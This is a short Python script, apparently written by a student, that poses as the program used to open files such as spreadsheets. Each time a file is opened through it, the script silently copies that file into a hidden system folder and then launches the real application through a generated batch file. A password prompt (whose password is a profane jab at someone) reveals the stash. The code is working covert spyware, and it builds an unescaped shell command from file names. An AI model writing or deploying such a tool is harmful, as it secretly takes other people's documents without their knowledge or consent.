import sys
import tkinter
import os
import shutil
import subprocess
import codecs
dirs = os.listdir()
desc = open("excel.txt","r")
f = desc.read()
desc.close()
if "copied" not in dirs:
    os.mkdir("copied")
    os.system("attrib /d copied +s +h")
args = sys.argv
def formatpath(path):
    for i in range(path.count("\\")):
        path = path.replace("\\","/")
    return path

def getname(path):
    return path[-formatpath(path)[::-1].find("/"):]
if len(args) == 1:
    root = tkinter.Tk()
    def ok(event):
        if e.get() == "fuckcmh":
            root.destroy()
            os.startfile("copied")
        else:
            root.destroy()
    e = tkinter.Entry(root,show="*")
    e.pack()
    e.bind("<Return>",ok)
    l = tkinter.Label(root,text="by ZHZX G2 jzwalliser")
    l.pack()
    root.mainloop()

else:
    #subprocess.call([f,args[1]])
    desc = codecs.open("bat.bat","w")
    desc.write(f + " \"" + args[1] + "\"")
    desc.close()
    shutil.copyfile(args[1],"./copied/" + getname(args[1]))
    os.system("bat.bat")
    print(f + " \"" + args[1] + "\"")
    
